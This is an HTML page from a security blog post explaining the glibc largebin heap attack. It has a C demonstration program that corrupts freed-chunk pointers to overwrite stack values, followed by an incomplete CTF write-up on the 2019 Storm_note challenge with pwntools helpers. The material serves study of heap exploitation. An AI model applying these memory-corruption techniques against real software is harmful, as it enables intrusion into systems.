@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>largebin attack | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="还是先了解一下 largebin 是啥大小：大于 1024 字节双向循环链表，先进先出，按照从大到小排序当有空闲块相邻的时候，chunk 会被合并除了 fd、bk 指针还有 fd_nextsize 和 bk_nextsize largebin Attack123456789101112131415161718192021222324252627282930313233343536373839404">
+<meta property="og:type" content="article">
+<meta property="og:title" content="largebin attack">
+<meta property="og:url" content="https://yichen115.github.io/2020/08/27/mdrz9g/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="还是先了解一下 largebin 是啥大小：大于 1024 字节双向循环链表，先进先出，按照从大到小排序当有空闲块相邻的时候，chunk 会被合并除了 fd、bk 指针还有 fd_nextsize 和 bk_nextsize largebin Attack123456789101112131415161718192021222324252627282930313233343536373839404">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1601726112454-9d1e1a28-8a3e-4bd6-9466-3f0a191e4f82.png#align=left&display=inline&height=119&margin=%5Bobject%20Object%5D&name=image.png&originHeight=151&originWidth=790&size=38205&status=done&style=none&width=620">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1601726161559-7a577348-14be-4379-98bb-5353469a6bbb.png#align=left&display=inline&height=123&margin=%5Bobject%20Object%5D&name=image.png&originHeight=156&originWidth=790&size=37655&status=done&style=none&width=621">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1601726360130-dfaf8ba3-83bb-4197-89aa-9754c73ff259.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=168&originWidth=788&size=42989&status=done&style=none&width=622">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1601727735498-a7be3820-c7a0-4621-9b1c-f9db8cb960df.png#align=left&display=inline&height=372&margin=%5Bobject%20Object%5D&name=image.png&originHeight=476&originWidth=789&size=91373&status=done&style=none&width=617">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1601727820165-23bf524c-f1f3-4809-be4b-67fdc63a7e6b.png#align=left&display=inline&height=263&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=530&size=48524&status=done&style=none&width=432">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1601728189811-ef2c685b-3f20-4b30-93be-b8995387c989.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=887&size=174311&status=done&style=none&width=574">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1598601873993-c0b4902b-42a4-4f56-91bc-4dbe6d80b518.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&name=image.png&originHeight=245&originWidth=536&size=18854&status=done&style=none&width=419">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1598601964886-20b1770c-3fb1-45b3-85a9-6ec734aca196.png#align=left&display=inline&height=344&margin=%5Bobject%20Object%5D&name=image.png&originHeight=443&originWidth=494&size=29741&status=done&style=none&width=384">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1598602040951-f97dd6c2-e926-45ee-ad79-914146303060.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=409&originWidth=781&size=33187&status=done&style=none&width=535">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1598620534078-59e46665-12bb-4661-be6b-4c263563ab2a.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=393&originWidth=1205&size=90980&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1598621185514-0bca624b-9a61-447e-9808-d05984c0bcc4.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=1212&size=93976&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1598621497631-f4fa4965-16c9-48af-9bb3-576e983f6816.png#align=left&display=inline&height=185&margin=%5Bobject%20Object%5D&name=image.png&originHeight=304&originWidth=1226&size=93722&status=done&style=none&width=746">
+<meta property="article:published_time" content="2020-08-27T07:27:23.000Z">
+<meta property="article:modified_time" content="2022-10-03T13:52:43.712Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1601726112454-9d1e1a28-8a3e-4bd6-9466-3f0a191e4f82.png#align=left&display=inline&height=119&margin=%5Bobject%20Object%5D&name=image.png&originHeight=151&originWidth=790&size=38205&status=done&style=none&width=620">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">largebin attack</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">largebin attack</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-08-27T07:27:23.000Z" itemprop="datePublished" class="page-time">
+  2020-08-27
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#largebin-Attack"><span class="post-toc-number">1.</span> <span class="post-toc-text">largebin Attack</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#2019-西湖论剑-Storm-note"><span class="post-toc-number">2.</span> <span class="post-toc-text">2019 西湖论剑 Storm_note</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-mdrz9g"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">largebin attack</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-08-27 15:27:23" datetime="2020-08-27T07:27:23.000Z"  itemprop="datePublished">2020-08-27</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>还是先了解一下 largebin 是啥<br>大小：大于 1024 字节<br>双向循环链表，先进先出，按照从大到小排序<br>当有空闲块相邻的时候，chunk 会被合并<br>除了 fd、bk 指针还有 fd_nextsize 和 bk_nextsize</p>
+<h1 id="largebin-Attack"><a href="#largebin-Attack" class="headerlink" title="largebin Attack"></a>largebin Attack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"根据原文描述跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"先来看一下目标:\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var1 (%p): %ld\n"</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var2 (%p): %ld\n\n"</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"分配第一个 large chunk: %p\n"</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"申请第二个 large chunk 在: %p\n"</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"同样在分配一个 fastbin 大小的 chunk 防止合并掉\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"最后申请第三个 large chunk 在: %p\n"</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中 [ %p &lt;--&gt; %p ]\n\n"</span>, (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中 [ %p ]\n\n"</span>, (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free 掉第三个，他会被放到 unsorted bin 中: [ %p &lt;--&gt; %p ]\n\n"</span>, (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"假设有个漏洞，可以覆盖掉第二个 chunk 的 \"size\" 以及 \"bk\"、\"bk_nextsize\" 指针\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x10，bk_nextsize 为 stack_var2-0x20\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var1 (%p): %p\n"</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var2 (%p): %p\n"</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>gcc -g 1.c</code><br>首先申请了几个 chunk</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601726112454-9d1e1a28-8a3e-4bd6-9466-3f0a191e4f82.png#align=left&display=inline&height=119&margin=%5Bobject%20Object%5D&name=image.png&originHeight=151&originWidth=790&size=38205&status=done&style=none&width=620" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>接下来释放掉前两个</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601726161559-7a577348-14be-4379-98bb-5353469a6bbb.png#align=left&display=inline&height=123&margin=%5Bobject%20Object%5D&name=image.png&originHeight=156&originWidth=790&size=37655&status=done&style=none&width=621" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>接下来去申请一个 0x90 大小的，他会把前面那个 0x320 大小的切割</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601726360130-dfaf8ba3-83bb-4197-89aa-9754c73ff259.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=168&originWidth=788&size=42989&status=done&style=none&width=622" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>同时因为我们去申请了，他就会给 unsortedbin 中的 free chunk 进行整理划分，把那两块大的放到 largebin<br>接下来去修改 p2，之前：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601727735498-a7be3820-c7a0-4621-9b1c-f9db8cb960df.png#align=left&display=inline&height=372&margin=%5Bobject%20Object%5D&name=image.png&originHeight=476&originWidth=789&size=91373&status=done&style=none&width=617" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>之后：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601727820165-23bf524c-f1f3-4809-be4b-67fdc63a7e6b.png#align=left&display=inline&height=263&margin=%5Bobject%20Object%5D&name=image.png&originHeight=323&originWidth=530&size=48524&status=done&style=none&width=432" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>我们伪造的分别是 p2 的 size、bk 以及 bk_nextsize，接下来申请一个 chunk，这样的话 p3 就会被整理到 largebin</p>
+<p>而 largebin 是按照从大到小排序的，所以需要进行排序，排序的操作大概是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//victim是p3、fwd是修改后的p2</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;<span class="comment">//1</span></span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//2</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim;<span class="comment">//3</span></span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//4</span></span><br><span class="line">&#125;</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
+
+<p>把 2 带入 4 得到：fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim<br>同时下面有：fwd-&gt;bk=victim<br>也就是说之前我们伪造的 p2 的 bk 跟 bk_nextsize 指向的地址被改为了 victim<br>即 (unsigned long)(&amp;stack_var1 - 2) 与 (unsigned long)(&amp;stack_var2 - 4) 被改为了 victim</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601728189811-ef2c685b-3f20-4b30-93be-b8995387c989.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=887&size=174311&status=done&style=none&width=574" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="2019-西湖论剑-Storm-note"><a href="#2019-西湖论剑-Storm-note" class="headerlink" title="2019 西湖论剑 Storm_note"></a>2019 西湖论剑 Storm_note</h1><p>这道题涉及 largebin attack、Chunk Extend<br>首先还是把程序的功能实现一下方便调用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">  p.sendlineafter((<span class="string">'Choice: '</span>),str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">  cmd(<span class="number">1</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'size ?\n'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">  cmd(<span class="number">2</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'Index ?\n'</span>,str(index))</span><br><span class="line">  p.sendlineafter(<span class="string">'Content: \n'</span>,content)</span><br></pre></td></tr></table></figure>
+
+<p>程序有个后门</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598601873993-c0b4902b-42a4-4f56-91bc-4dbe6d80b518.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&name=image.png&originHeight=245&originWidth=536&size=18854&status=done&style=none&width=419" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在 edit 功能有一个 off by null 漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598601964886-20b1770c-3fb1-45b3-85a9-6ec734aca196.png#align=left&display=inline&height=344&margin=%5Bobject%20Object%5D&name=image.png&originHeight=443&originWidth=494&size=29741&status=done&style=none&width=384" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这里禁用了 fastbin 功能</p>
+<blockquote>
+<p>int mallopt(int param,int value)为内存分配控制函数，此处 param 参数取值为 M_MXFAST，控制着 fastbin 大小上限，此处设置为 1，表示禁用 fastbin</p>
+</blockquote>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598602040951-f97dd6c2-e926-45ee-ad79-914146303060.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=409&originWidth=781&size=33187&status=done&style=none&width=535" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>找了很多 exp 都打不通 Orz，我又都是跟着 exp 一点一点理解的，很难受 Orz<br>不管打不打得通了，直接调试看看吧，</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598620534078-59e46665-12bb-4661-be6b-4c263563ab2a.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=393&originWidth=1205&size=90980&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>修改一下最后一个 0x10 的最后 0x8 字节的内容（不理解，待会再看）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598621185514-0bca624b-9a61-447e-9808-d05984c0bcc4.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=1212&size=93976&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后把第 1 个释放掉，编辑第 0 个，通过 off by null 来把第一个的 size 位改成 0x500（原本是 0x510）<br>改掉之后可以看到整个都偏了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1598621497631-f4fa4965-16c9-48af-9bb3-576e983f6816.png#align=left&display=inline&height=185&margin=%5Bobject%20Object%5D&name=image.png&originHeight=304&originWidth=1226&size=93722&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>现在，我们之前在第 1 个留的 0x500 就是 2 的 prev_size 了<br>接下来申请一个 0x18 一个 0x4d8（这俩都是在改掉大小后的 index1 那里正好占起来）<br>然后 create(0x30) 之后 index2 和 index7 就重合了。。。又不懂了</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-10-03T13:52:43.712Z" itemprop="dateUpdated">2022-10-03 21:52:43</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/08/27/mdrz9g/&title=《largebin attack》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/08/27/mdrz9g/&title=《largebin attack》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/08/27/mdrz9g/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《largebin attack》 — yichen's blog&url=https://yichen115.github.io/2020/08/27/mdrz9g/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/08/27/mdrz9g/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
